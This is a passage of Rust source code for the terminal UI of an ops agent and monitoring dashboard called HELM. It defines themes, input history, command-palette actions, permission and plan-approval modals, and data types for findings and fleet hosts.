//! Full-screen HELM terminal UI built with ratatui.

use std::cell::Cell as StdCell;
use std::{
    collections::{HashMap, HashSet, VecDeque},
    io,
    path::PathBuf,
    sync::{
        Arc,
        atomic::{AtomicBool, Ordering},
    },
    time::{Duration, Instant},
};

use anyhow::{Context, Result, anyhow};
use chrono::Utc;
use crossterm::{
    event::{
        self, DisableMouseCapture, EnableMouseCapture, Event, KeyCode, KeyEvent, KeyModifiers,
        MouseEventKind,
    },
    execute,
    terminal::{EnterAlternateScreen, LeaveAlternateScreen, disable_raw_mode, enable_raw_mode},
};
use helm_core::{Capability, Message};
use helm_memory::{
    ChangeSetRecord, ChangeSetStore, FindingStateRecord, FindingStateStatus, FindingStateStore,
    MemoryStore, TroubleshootingPlanRecord,
};
use helm_monitor::{
    CollectorError, CommandValidator, Finding, FindingSummaryFields, MonitorProfile,
    SnapshotDomains, build_narrative_prompt, parse_llm_response,
};
use helm_providers::ChatRequest;
use ratatui::{
    Frame, Terminal,
    backend::CrosstermBackend,
    buffer::Buffer,
    layout::{Constraint, Direction, Layout, Rect},
    prelude::Widget,
    style::{Color, Modifier, Style},
    text::{Line, Span},
    widgets::{Block, BorderType, Borders, Cell, Clear, ListItem, Paragraph, Row, Table, Wrap},
};
use serde::Deserialize;
use tokio::{runtime::Handle, sync::mpsc, task::JoinHandle};
use uuid::Uuid;

use crate::{
    ProviderChoice, ProviderSettings, TroubleshootingPlanStore, build_provider, custom_commands,
    default_api_key_env, default_model_name, keybindings::KeyMap, provider_choice_name,
    remote::RemoteRegistry, wrap_for_remote, write_helm_config,
};
use crate::{sandbox::ResolvedSandbox, secrets::SecretsStore};

/// Sparkline / trend configuration loaded from thresholds.toml.
#[derive(Debug, Clone, Deserialize)]
struct ThresholdsConfig {
    #[serde(default = "default_sparkline_depth")]
    sparkline_history_depth: usize,
}

fn default_sparkline_depth() -> usize {
    60
}

impl Default for ThresholdsConfig {
    fn default() -> Self {
        Self {
            sparkline_history_depth: default_sparkline_depth(),
        }
    }
}

fn load_thresholds_config() -> ThresholdsConfig {
    let config_path = crate::paths::config_dir().join("thresholds.toml");
    if let Ok(content) = std::fs::read_to_string(&config_path) {
        toml::from_str(&content).unwrap_or_default()
    } else {
        ThresholdsConfig::default()
    }
}

const APP_BG: Color = Color::Rgb(11, 19, 30);
const APP_FG: Color = Color::Rgb(208, 214, 224);
const HEADER_BG: Color = Color::Rgb(26, 41, 64);
const HEADER_BORDER: Color = Color::Rgb(45, 123, 215);
const USER_BG: Color = Color::Rgb(31, 44, 60);
const USER_FG: Color = Color::Rgb(224, 229, 240);
const USER_BAR: Color = Color::Rgb(45, 123, 215);
const ASSISTANT_BG: Color = Color::Rgb(13, 26, 40);
const ASSISTANT_FG: Color = Color::Rgb(200, 210, 224);
const ASSISTANT_BAR: Color = Color::Rgb(74, 144, 217);
const TOOL_BG: Color = Color::Rgb(18, 35, 59);
const TOOL_FG: Color = Color::Rgb(139, 164, 204);
const ERROR_BG: Color = Color::Rgb(31, 17, 21);
const ERROR_FG: Color = Color::Rgb(242, 139, 130);
const ERROR_BAR: Color = Color::Rgb(217, 58, 58);
const INPUT_BG: Color = Color::Rgb(10, 17, 24);
const INPUT_FOCUS: Color = Color::Rgb(45, 123, 215);
const INPUT_IDLE: Color = Color::Rgb(42, 58, 74);
const MODAL_BG: Color = Color::Rgb(19, 34, 53);
const MODAL_FG: Color = Color::Rgb(203, 209, 222);
const DIM_FG: Color = Color::Rgb(103, 119, 139);
const SUCCESS_FG: Color = Color::Rgb(111, 221, 137);

// ── HELMOPS color palette ──────────────────────────────────────────
const OPS_BG: Color = Color::Rgb(13, 17, 23);
const OPS_SURFACE: Color = Color::Rgb(22, 27, 34);
const OPS_BORDER: Color = Color::Rgb(33, 38, 45);
const OPS_FG: Color = Color::Rgb(201, 209, 217);
const OPS_MUTED: Color = Color::Rgb(139, 148, 158);
const OPS_DIM: Color = Color::Rgb(110, 118, 129);
const OPS_BLUE: Color = Color::Rgb(88, 166, 255);
const OPS_GREEN: Color = Color::Rgb(63, 185, 80);
const OPS_YELLOW: Color = Color::Rgb(210, 153, 34);
const OPS_RED: Color = Color::Rgb(248, 81, 73);

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum Theme {
    #[default]
    Dark,
    Light,
    Dim,
    Dracula,
    Solarized,
    #[allow(dead_code)]
    Custom {
        bg: Color,
        fg: Color,
        accent: Color,
    },
}

#[allow(dead_code)]
impl Theme {
    pub fn colors(&self) -> (Color, Color, Color) {
        match self {
            Theme::Dark => (
                Color::Rgb(11, 19, 30),
                Color::Rgb(208, 214, 224),
                Color::Rgb(45, 123, 215),
            ),
            Theme::Light => (
                Color::Rgb(254, 254, 254),
                Color::Rgb(26, 26, 26),
                Color::Rgb(45, 123, 215),
            ),
            Theme::Dim => (
                Color::Rgb(40, 40, 40),
                Color::Rgb(180, 180, 180),
                Color::Rgb(45, 123, 215),
            ),
            Theme::Dracula => (
                Color::Rgb(40, 42, 54),
                Color::Rgb(248, 248, 242),
                Color::Rgb(98, 114, 164),
            ),
            Theme::Solarized => (
                Color::Rgb(0, 43, 54),
                Color::Rgb(131, 148, 150),
                Color::Rgb(181, 137, 0),
            ),
            Theme::Custom { bg, fg, accent } => (*bg, *fg, *accent),
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            Theme::Dark => "dark",
            Theme::Light => "light",
            Theme::Dim => "dim",
            Theme::Dracula => "dracula",
            Theme::Solarized => "solarized",
            Theme::Custom { .. } => "custom",
        }
    }

    pub fn all() -> Vec<Theme> {
        vec![
            Theme::Dark,
            Theme::Light,
            Theme::Dim,
            Theme::Dracula,
            Theme::Solarized,
        ]
    }
}

/// Runtime dependencies needed by the TUI.
#[allow(dead_code)]
pub(crate) struct TuiRuntime {
    pub(crate) provider_settings: ProviderSettings,
    pub(crate) db_path: PathBuf,
    pub(crate) config_path: PathBuf,
    pub(crate) memory: Arc<MemoryStore>,
    pub(crate) max_iterations: Option<u32>,
    pub(crate) secrets: SecretsStore,
    pub(crate) tui_paste_key_modal: bool,
    pub(crate) auto_approve: bool,
    pub(crate) read_only: bool,
    pub(crate) diagnose_mode: bool,
    pub(crate) dashboard_mode: bool,
    pub(crate) sandbox: Option<ResolvedSandbox>,
    pub(crate) remote_target: Option<String>,
}

/// Starts the interactive terminal UI.
pub(crate) async fn run_tui(runtime: TuiRuntime) -> Result<()> {
    enable_raw_mode().context("failed to enable raw mode")?;
    let mut stdout = io::stdout();
    execute!(stdout, EnterAlternateScreen, EnableMouseCapture)
        .context("failed to enter alternate screen")?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend).context("failed to initialize terminal")?;
    terminal.clear().ok();

    let result = TuiApp::new(runtime).run(&mut terminal).await;

    disable_raw_mode().ok();
    execute!(
        terminal.backend_mut(),
        DisableMouseCapture,
        LeaveAlternateScreen
    )
    .ok();
    terminal.show_cursor().ok();
    result
}

#[derive(Debug)]
enum UiEvent {
    Input(Event),
    Tick,
    DashboardRefresh,
    DashboardLiveRefresh,
    TickSkipped,
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum MessageRole {
    User,
    Assistant,
    System,
    Activity,
    Error,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ChatMessage {
    role: MessageRole,
    text: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ToolTimelineItem {
    status: String,
    tool: String,
    detail: String,
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
struct SessionState {
    episode_id: Option<String>,
    chat: Vec<ChatMessage>,
    transcript_scroll: usize,
    tool_timeline: Vec<ToolTimelineItem>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct InputState {
    text: String,
    cursor: usize,
    history: Vec<String>,
    history_index: Option<usize>,
    draft: String,
}

impl InputState {
    fn new() -> Self {
        Self {
            text: String::new(),
            cursor: 0,
            history: Vec::new(),
            history_index: None,
            draft: String::new(),
        }
    }

    fn insert(&mut self, ch: char) {
        let byte = char_to_byte(&self.text, self.cursor);
        self.text.insert(byte, ch);
        self.cursor = self.cursor.saturating_add(1);
    }

    fn insert_newline(&mut self) {
        self.insert('\n');
    }

    fn backspace(&mut self) {
        if self.cursor == 0 {
            return;
        }
        let byte = char_to_byte(&self.text, self.cursor.saturating_sub(1));
        self.text.remove(byte);
        self.cursor = self.cursor.saturating_sub(1);
    }

    fn delete(&mut self) {
        if self.cursor >= self.text.chars().count() {
            return;
        }
        let byte = char_to_byte(&self.text, self.cursor);
        self.text.remove(byte);
    }

    fn clear(&mut self) {
        self.text.clear();
        self.cursor = 0;
        self.history_index = None;
    }

    fn take_submit(&mut self) -> Option<String> {
        let task = self.text.trim().to_owned();
        if task.is_empty() {
            return None;
        }
        if self.history.last() != Some(&task) {
            self.history.push(task.clone());
        }
        self.clear();
        Some(task)
    }

    fn previous_history(&mut self) {
        if self.history.is_empty() {
            return;
        }
        match self.history_index {
            None => {
                self.draft = self.text.clone();
                self.history_index = Some(self.history.len().saturating_sub(1));
            }
            Some(0) => {}
            Some(index) => self.history_index = Some(index.saturating_sub(1)),
        }
        if let Some(index) = self.history_index {
            self.text = self.history[index].clone();
            self.cursor = self.text.chars().count();
        }
    }

    fn next_history(&mut self) {
        match self.history_index {
            None => {}
            Some(index) if index + 1 < self.history.len() => {
                self.history_index = Some(index + 1);
                self.text = self.history[index + 1].clone();
                self.cursor = self.text.chars().count();
            }
            Some(_) => {
                self.history_index = None;
                self.text = self.draft.clone();
                self.cursor = self.text.chars().count();
            }
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum PanelFocus {
    Input,
}

#[derive(Debug, Clone, PartialEq)]
enum ModalState {
    CommandPalette,
    Permission {
        capability: Capability,
        tool_name: String,
        taint: String,
        detail: String,
    },
    ProviderSelector {
        selected: usize,
    },
    ModelSelector {
        query: String,
        selected: usize,
        entries: Vec<ModelCatalogEntry>,
    },
    ApiKeyInput {
        choice: ProviderChoice,
        input: String,
    },
    #[allow(dead_code)]
    AuthRequired {
        provider_name: String,
        env_name: String,
        input: String,
        error: Option<String>,
    },
    Help,
    ThemeSelector {
        selected: usize,
    },
    CostMeter {
        session_tokens_in: u64,
        session_tokens_out: u64,
        session_cost_usd: f64,
    },
    /// Command-by-command plan execution approval.
    PlanExecution {
        plan_id: String,
        plan_title: String,
        step_index: usize,
        step_count: usize,
        step_previews: Vec<String>,
        step_effects: Vec<String>,
        step_tools: Vec<String>,
        step_risks: Vec<String>,
        phase: PlanExecPhase,
        result_summary: String,
    },
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[allow(dead_code)]
enum PlanExecPhase {
    Loading,
    Approving,
    Running,
    Done,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct CommandPaletteState {
    query: String,
    selected: usize,
}

impl CommandPaletteState {
    fn new() -> Self {
        Self {
            query: String::new(),
            selected: 0,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ModelCatalogEntry {
    group: String,
    label: String,
    provider: ProviderChoice,
    model: String,
    note: Option<String>,
}

#[derive(Debug, Clone)]
struct CachedModelCatalog {
    fetched_at: Instant,
    entries: Vec<ModelCatalogEntry>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ProviderKeyStatus {
    NoKeyNeeded,
    Env,
    Stored,
    Session,
    Unset,
}

impl ProviderKeyStatus {
    fn label(self, env_name: Option<&str>) -> String {
        match self {
            Self::NoKeyNeeded => "no key needed".to_owned(),
            Self::Env => format!("{} via env", env_name.unwrap_or("API_KEY")),
            Self::Stored => format!("{} stored", env_name.unwrap_or("API_KEY")),
            Self::Session => "session override".to_owned(),
            Self::Unset => format!("{} unset", env_name.unwrap_or("API_KEY")),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum CommandAction {
    NewSession,
    Clear,
    Replay,
    Doctor,
    Remote,
    Provider,
    Model,
    Permissions,
    Audit,
    Skills,
    Browser,
    Init,
    Sessions,
    Resume,
    Config,
    Theme,
    Keybindings,
    Stats,
    Mcp,
    Compact,
    Diff,
    Tools,
    Undo,
    Redo,
    Cost,
    Quit,
    Help,
    Diagnose,
    Evidence,
    ApplyPlan,
    Dashboard,
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum PaletteItem {
    BuiltIn(CommandAction),
    Custom(custom_commands::CustomCommand),
}

impl PaletteItem {
    fn label(&self) -> String {
        match self {
            Self::BuiltIn(action) => action.label().to_owned(),
            Self::Custom(command) => format!("Custom: {}", command.name),
        }
    }

    fn slug(&self) -> String {
        match self {
            Self::BuiltIn(action) => action.slug().to_owned(),
            Self::Custom(command) => command.name.clone(),
        }
    }

    fn description(&self) -> String {
        match self {
            Self::BuiltIn(action) => action.description().to_owned(),
            Self::Custom(command) => command.description.clone(),
        }
    }

    fn matches_query(&self, query: &str) -> bool {
        if query.is_empty() {
            return true;
        }
        let query = query.to_ascii_lowercase();
        self.label().to_ascii_lowercase().contains(&query)
            || self.slug().to_ascii_lowercase().contains(&query)
            || self.description().to_ascii_lowercase().contains(&query)
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum SlashItem {
    BuiltIn(CommandAction),
    Custom(custom_commands::CustomCommand),
}

impl SlashItem {
    fn slug(&self) -> &str {
        match self {
            Self::BuiltIn(action) => action.slug(),
            Self::Custom(command) => &command.name,
        }
    }

    fn label(&self) -> String {
        match self {
            Self::BuiltIn(action) => action.label().to_owned(),
            Self::Custom(command) => format!("Custom: {}", command.name),
        }
    }

    fn description(&self) -> String {
        match self {
            Self::BuiltIn(action) => action.description().to_owned(),
            Self::Custom(command) => command.description.clone(),
        }
    }
}

impl CommandAction {
    fn all() -> Vec<Self> {
        vec![
            Self::NewSession,
            Self::Clear,
            Self::Replay,
            Self::Doctor,
            Self::Remote,
            Self::Provider,
            Self::Model,
            Self::Permissions,
            Self::Audit,
            Self::Skills,
            Self::Browser,
            Self::Init,
            Self::Sessions,
            Self::Resume,
            Self::Config,
            Self::Theme,
            Self::Keybindings,
            Self::Stats,
            Self::Mcp,
            Self::Compact,
            Self::Diff,
            Self::Tools,
            Self::Undo,
            Self::Redo,
            Self::Cost,
            Self::Quit,
            Self::Help,
            Self::Diagnose,
            Self::Evidence,
            Self::ApplyPlan,
            Self::Dashboard,
        ]
    }

    fn label(self) -> &'static str {
        match self {
            Self::NewSession => "New Session",
            Self::Clear => "Clear Transcript",
            Self::Replay => "Replay Episode",
            Self::Doctor => "Doctor",
            Self::Remote => "Remote Target",
            Self::Provider => "Provider Selector",
            Self::Model => "Model Selector",
            Self::Permissions => "Permissions",
            Self::Audit => "Audit Verify",
            Self::Skills => "Skills",
            Self::Browser => "Browser Status",
            Self::Init => "Init AGENTS.md",
            Self::Sessions => "Sessions",
            Self::Resume => "Resume",
            Self::Config => "Config Editor",
            Self::Theme => "Theme Selector",
            Self::Keybindings => "Keybindings",
            Self::Stats => "Stats",
            Self::Mcp => "MCP Servers",
            Self::Compact => "Compact",
            Self::Diff => "Diff Last Edit",
            Self::Tools => "Tools",
            Self::Undo => "Undo",
            Self::Redo => "Redo",
            Self::Cost => "Cost Meter",
            Self::Quit => "Quit",
            Self::Help => "Help",
            Self::Diagnose => "Diagnose Mode",
            Self::Evidence => "Evidence Report",
            Self::ApplyPlan => "Execute Plan",
            Self::Dashboard => "Dashboard",
        }
    }

    fn slug(self) -> &'static str {
        match self {
            Self::NewSession => "new",
            Self::Clear => "clear",
            Self::Replay => "replay",
            Self::Doctor => "doctor",
            Self::Remote => "remote",
            Self::Provider => "provider",
            Self::Model => "model",
            Self::Permissions => "permissions",
            Self::Audit => "audit",
            Self::Skills => "skills",
            Self::Browser => "browser",
            Self::Init => "init",
            Self::Sessions => "sessions",
            Self::Resume => "resume",
            Self::Config => "config",
            Self::Theme => "theme",
            Self::Keybindings => "keybindings",
            Self::Stats => "stats",
            Self::Mcp => "mcp",
            Self::Compact => "compact",
            Self::Diff => "diff",
            Self::Tools => "tools",
            Self::Undo => "undo",
            Self::Redo => "redo",
            Self::Cost => "cost",
            Self::Quit => "quit",
            Self::Help => "help",
            Self::Diagnose => "diagnose",
            Self::Evidence => "evidence",
            Self::ApplyPlan => "apply-plan",
            Self::Dashboard => "dashboard",
        }
    }

    fn description(self) -> &'static str {
        match self {
            Self::NewSession => "clear transcript and start over",
            Self::Clear => "clear the visible transcript",
            Self::Replay => "show replay command for this episode",
            Self::Doctor => "show provider and system diagnostics hint",
            Self::Remote => "show or switch the active remote target",
            Self::Provider => "switch LLM backend",
            Self::Model => "edit active model id",
            Self::Permissions => "grant or inspect capabilities",
            Self::Audit => "verify audit log chain",
            Self::Skills => "inspect local skill library",
            Self::Browser => "browser automation status",
            Self::Init => "generate AGENTS.md in the current project",
            Self::Sessions => "show session-resume guidance",
            Self::Resume => "show resume guidance",
            Self::Config => "view or edit config inline (/config key=value)",
            Self::Theme => "switch theme (/theme dracula)",
            Self::Keybindings => "show keybinding overrides in the HELM XDG config directory",
            Self::Stats => "show token usage and cost since today",
            Self::Mcp => "list MCP servers",
            Self::Compact => "summarize transcript to reclaim context",
            Self::Diff => "show diff of the last fs_write",
            Self::Tools => "list loaded tools and capabilities",
            Self::Undo => "undo last agent file edit",
            Self::Redo => "redo last undone agent edit",
            Self::Cost => "open the session cost meter",
            Self::Quit => "exit HELM",
            Self::Help => "keyboard shortcuts and commands",
            Self::Diagnose => "switch to diagnose mode (read-only, limited tools)",
            Self::Evidence => "show evidence report for last tool call",
            Self::ApplyPlan => "execute a troubleshooting plan with step approval",
            Self::Dashboard => "switch to monitoring dashboard",
        }
    }

    fn matches_slug(self, slug: &str) -> bool {
        match self {
            Self::Quit => matches!(slug, "quit" | "exit" | "q"),
            Self::NewSession => matches!(slug, "new" | "n"),
            Self::Clear => slug == "clear",
            Self::Replay => slug == "replay",
            Self::Doctor => slug == "doctor",
            Self::Remote => slug == "remote",
            Self::Provider => slug == "provider",
            Self::Model => slug == "model",
            Self::Permissions => slug == "permissions",
            Self::Audit => slug == "audit",
            Self::Skills => slug == "skills",
            Self::Browser => slug == "browser",
            Self::Init => slug == "init",
            Self::Sessions => slug == "sessions",
            Self::Resume => slug == "resume",
            Self::Config => slug == "config",
            Self::Theme => slug == "theme",
            Self::Keybindings => matches!(slug, "keybindings" | "keybinds" | "keys"),
            Self::Stats => matches!(slug, "stats" | "usage"),
            Self::Mcp => slug == "mcp",
            Self::Compact => slug == "compact",
            Self::Diff => slug == "diff",
            Self::Tools => slug == "tools",
            Self::Undo => slug == "undo",
            Self::Redo => slug == "redo",
            Self::Cost => slug == "cost",
            Self::Help => slug == "help",
            Self::Diagnose => slug == "diagnose",
            Self::Evidence => slug == "evidence",
            Self::ApplyPlan => slug == "apply-plan",
            Self::Dashboard => matches!(slug, "dashboard" | "monitor"),
        }
    }

    fn from_slug(slug: &str) -> Option<Self> {
        Self::all()
            .into_iter()
            .find(|action| action.matches_slug(slug))
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AgentMode {
    Dashboard,
}

impl AgentMode {
    fn as_str(self) -> &'static str {
        "Dashboard"
    }
}

// ── Dashboard types ────────────────────────────────────────────────────────

#[derive(Debug, Clone, Default)]
#[allow(dead_code)]
struct FindingSummary {
    id: String,
    fingerprint: String,
    severity: String,
    title: String,
    confidence: String,
    affected_resource: String,
    snapshot_id: String,
    domain: String,
    kind: String,
    host: String,
    status: DashboardFindingState,
    occurrence_count: usize,
    first_seen: i64,
    last_seen: i64,
    age_label: String,
    sample: String,
    state_note: String,
    evidence_text: String,
    evidence_sources: Vec<String>,
    impact: String,
    assumptions: Vec<String>,
    missing_data: Vec<String>,
    read_only_checks: Vec<String>,
    fix_plan: Option<String>,
    risk: String,
    rollback: String,
    command_preview: String,
    detector_id: String,
    correlated_finding_ids: Vec<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum DashboardFocus {
    Tabbar,
    #[default]
    Table,
    Detail,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OpsTab {
    Alerts,
    Services,
    Processes,
    Logs,
    Network,
    Disk,
    Changes,
    Fleet,
}

impl OpsTab {
    fn all() -> &'static [Self] {
        &[
            Self::Alerts,
            Self::Services,
            Self::Processes,
            Self::Logs,
            Self::Network,
            Self::Disk,
            Self::Changes,
            Self::Fleet,
        ]
    }
    fn label(self) -> &'static str {
        match self {
            Self::Alerts => "ALERTS",
            Self::Services => "SERVICES",
            Self::Processes => "PROCESSES",
            Self::Logs => "LOGS",
            Self::Network => "NETWORK",
            Self::Disk => "DISK",
            Self::Changes => "CHANGES",
            Self::Fleet => "FLEET",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
#[allow(dead_code)]
enum DashboardAgeFilter {
    #[default]
    Any,
    UnderOneDay,
    TwoToSevenDays,
    EightToThirtyDays,
    OverThirtyDays,
}

#[allow(dead_code)]
impl DashboardAgeFilter {
    #[allow(dead_code)]
    fn all() -> &'static [Self] {
        &[
            Self::Any,
            Self::UnderOneDay,
            Self::TwoToSevenDays,
            Self::EightToThirtyDays,
            Self::OverThirtyDays,
        ]
    }

    fn label(self) -> &'static str {
        match self {
            Self::Any => "Any age",
            Self::UnderOneDay => "<= 1d",
            Self::TwoToSevenDays => "2-7d",
            Self::EightToThirtyDays => "8-30d",
            Self::OverThirtyDays => "30d+",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum DashboardFindingState {
    #[default]
    Open,
    New,
    Recurring,
    Suppressed,
    Resolved,
    SelfResolved,
}

impl DashboardFindingState {
    fn label(self) -> &'static str {
        match self {
            Self::Open => "Open",
            Self::New => "New",
            Self::Recurring => "Recurring",
            Self::Suppressed => "Suppressed",
            Self::Resolved => "Resolved",
            Self::SelfResolved => "Self-resolved",
        }
    }
}

/// Filter for finding queue by state (cycled with Left/Right when table focused).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum DashboardFindingStateFilter {
    #[default]
    Active,
    All,
    NewOnly,
    OpenOnly,
    RecurringOnly,
    SuppressedOnly,
    ResolvedOnly,
}

impl DashboardFindingStateFilter {
    fn all() -> &'static [Self] {
        &[
            Self::Active,
            Self::All,
            Self::NewOnly,
            Self::OpenOnly,
            Self::RecurringOnly,
            Self::SuppressedOnly,
            Self::ResolvedOnly,
        ]
    }

    #[allow(dead_code)]
    fn label(self) -> &'static str {
        match self {
            Self::Active => "Active",
            Self::All => "All",
            Self::NewOnly => "New",
            Self::OpenOnly => "Open",
            Self::RecurringOnly => "Recurring",
            Self::SuppressedOnly => "Suppressed",
            Self::ResolvedOnly => "Resolved",
        }
    }
}

#[derive(Debug, Clone, Default)]
struct DashboardMetrics {
    open: usize,
    new: usize,
    recurring: usize,
    self_resolved: usize,
    suppressed: usize,
    resolved: usize,
    critical: usize,
    warning: usize,
}

/// Per-host fleet status for multi-host view.
#[derive(Debug, Clone)]
#[allow(dead_code)]
struct FleetHostStatus {
    pub host_id: Uuid,
    pub name: String,
    pub reachable: bool,
    pub crit: usize,
    pub warn: usize,
    pub info: usize,
    pub last_refresh: Option<Instant>,
    pub error: Option<String>,
}

#[derive(Debug, Clone, Default)]
#[allow(dead_code)]
struct DashboardData {
    hostname: String,
    profile: String,
    cpu_percent: f64,
    load_1m: f64,
    load_5m: f64,
    load_15m: f64,
    memory_used_pct: f64,
    disk_entries: Vec<String>,
    disk_bars: Vec<(String, u8)>,
    total_services: usize,
    failed_services: usize,
    total_containers: usize,
    running_containers: usize,
    listening_ports: usize,
    last_log_errors: u64,
    backup_count: usize,
    finding_count: usize,
    finding_warnings: usize,
    collected_at: String,
    findings: Vec<FindingSummary>,
    hosts: Vec<String>,
    kinds: Vec<String>,
    metrics: DashboardMetrics,
    kind_distribution: Vec<(String, u64)>,
    age_distribution: Vec<(String, u64)>,
    snapshot_id: String,
    collector_errors: Vec<String>,
    /// Per-collector health: (domain_name, is_healthy, optional_error_reason).
    collector_health: Vec<(String, bool, Option<String>)>,
    domains: SnapshotDomains,
    plans: Vec<TroubleshootingPlanRecord>,
    change_sets: Vec<ChangeSetRecord>,
    audit_events: Vec<DashboardAuditRow>,
    last_tick_instant: Option<Instant>,
    tick_count: u64,
    ticks_skipped: u64,
    consecutive_skips: u64,
    /// Ring buffers for sparkline rendering (cap 60 points each).
    cpu_history: VecDeque<f64>,
    mem_history: VecDeque<f64>,
    load_history: VecDeque<f64>,
    disk_history: VecDeque<f64>,
    /// Per-host fleet status for multi-host view.
    fleet_hosts: Vec<FleetHostStatus>,
}

#[derive(Debug, Clone, Default)]
struct DashboardAuditRow {
    time: String,
    capability: String,
    command: String,
    decision: String,
}

/// Which sub-view the dashboard is showing.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum DashboardView {
    #[default]
    Overview,
    FindingDetail(usize),
    EvidenceView(usize),
    TroubleshootPlan(usize),
}

/// A validated fix step ready for display.
#[derive(Debug, Clone)]
struct ValidatedFixStep {
    command: String,
    purpose: String,
    risk: String,
    rollback: String,
    binary_warnings: Vec<String>,
}

/// The status of an LLM-generated troubleshooting plan.
#[derive(Debug, Clone)]
#[allow(dead_code)]
enum PlanStatus {
    Loading {
        started_at: i64,
    },
    Ready {
        narrative: String,
        fix_steps: Vec<ValidatedFixStep>,
    },
    Timeout,
    RateLimited {
        retry_after_secs: u64,
    },
    AuthFailed,
    MalformedResponse,
    DangerousCommand {
        pattern: String,
        command_text: String,
    },
}

#[derive(Debug, Clone)]
#[allow(dead_code)]
struct DashboardPlan {
    finding_id: String,
    plan_id: String,
    status: PlanStatus,
    read_only_steps: usize,
    fix_steps: usize,
    rate_limit_retry_at: Option<Instant>,
    rate_limit_retry_pending: bool,
}

#[derive(Debug, Clone)]
struct PinnedIncidentState {
    fingerprint: String,
    active_plan_id: Option<String>,
}

impl DashboardPlan {
    fn summary_from_status(&self) -> String {
        match &self.status {
            PlanStatus::Loading { .. } => "⏳ Generating plan…".into(),
            PlanStatus::Ready { narrative, .. } => narrative.clone(),
            PlanStatus::Timeout => "LLM call timed out after 30s. Press Alt+G to retry.".into(),
            PlanStatus::RateLimited { retry_after_secs } => {
                format!("Rate limited. Retrying in {retry_after_secs}s…")
            }
            PlanStatus::AuthFailed => {
                "Provider authentication failed. Run `helmops init --provider X` to reconfigure."
                    .into()
            }
            PlanStatus::MalformedResponse => {
                "LLM returned unparseable response. Debug info logged. Press Alt+G to retry.".into()
            }
            PlanStatus::DangerousCommand { pattern, .. } => {
                format!(
                    "Command rejected: {pattern}. Manual review required. The rejected command has been logged."
                )
            }
        }
    }
}

#[derive(Debug)]
struct DashboardState {
    data: DashboardData,
    view: DashboardView,
    pane: DashboardFocus,
    active_tab: OpsTab,
    selected_fingerprint: Option<String>,
    pinned_incident: Option<PinnedIncidentState>,
    table_scroll: usize,
    detail_scroll: usize,
    finding_state_filter: DashboardFindingStateFilter,
    active_plan: Option<DashboardPlan>,
    pending_plan_rx: Option<tokio::sync::oneshot::Receiver<PlanStatus>>,
    error: Option<String>,
    overlap_guard: Option<Arc<AtomicBool>>,
    /// Max history points for sparklines (loaded from thresholds.toml, default 60).
    sparkline_history_depth: usize,
    /// Selected row in Fleet tab for multi-host view.
    fleet_selected_row: Option<usize>,
}

impl DashboardState {
    fn new() -> Self {
        let thresholds = load_thresholds_config();
        Self {
            data: DashboardData::default(),
            view: DashboardView::Overview,
            pane: DashboardFocus::Table,
            active_tab: OpsTab::Alerts,
            selected_fingerprint: None,
            pinned_incident: None,
            table_scroll: 0,
            detail_scroll: 0,
            finding_state_filter: DashboardFindingStateFilter::default(),
            active_plan: None,
            pending_plan_rx: None,
            error: None,
            overlap_guard: None,
            sparkline_history_depth: thresholds.sparkline_history_depth.clamp(10, 300),
            fleet_selected_row: None,
        }
    }
}

fn format_relative_age(timestamp: i64) -> String {
    let now = Utc::now().timestamp();
    let age_secs = now.saturating_sub(timestamp).max(0);
    let mins = age_secs / 60;
    let hours = age_secs / 3600;
    let days = age_secs / 86_400;
    if mins < 60 {
        format!("{mins}m")
    } else if hours < 24 {
        format!("{hours}h")
    } else {
        format!("{days}d")
    }
}

fn format_open_duration_since(timestamp: i64) -> String {
    format!("open {}", format_relative_age(timestamp))
}

fn format_last_seen_since(timestamp: i64) -> String {
    format!("seen {}", format_relative_age(timestamp))
}

fn format_dashboard_when(timestamp: i64) -> String {
    let ts = chrono::DateTime::from_timestamp(timestamp, 0)
        .map(|dt| dt.format("%H:%M:%S UTC").to_string())
        .unwrap_or_else(|| "unknown".to_owned());
    let now = Utc::now().timestamp();
    let age_secs = now.saturating_sub(timestamp).max(0);
    let rel = if age_secs < 60 {
        format!("{age_secs}s ago")
    } else if age_secs < 3600 {
        format!("{} min ago", age_secs / 60)
    } else if age_secs < 86_400 {
        format!("{}h ago", age_secs / 3600)
    } else {
        format!("{}d ago", age_secs / 86_400)
    };
    format!("{ts} ({rel})")
}

fn finding_id_from_source(source: &str) -> Option<&str> {
    source.strip_prefix("finding:").map(str::trim)
}

fn next_audit_timestamp(conn: &rusqlite::Connection) -> Result<i64> {
    let latest: Option<i64> = conn
        .query_row(
            "SELECT MAX(timestamp) FROM audit_events WHERE target IS ?1",
            ["tui"],
            |row| row.get(0),
        )
        .ok();
    let now = chrono::Utc::now().timestamp_millis();
    Ok(match latest {
        Some(ts) if ts >= now => ts.saturating_add(1),
        _ => now,
    })
}

fn age_bucket(timestamp: i64) -> DashboardAgeFilter {
    let now = Utc::now().timestamp();
    let age_secs = now.saturating_sub(timestamp).max(0);
    let days = age_secs / 86_400;
    match days {
        0..=1 => DashboardAgeFilter::UnderOneDay,
        2..=7 => DashboardAgeFilter::TwoToSevenDays,
        8..=30 => DashboardAgeFilter::EightToThirtyDays,
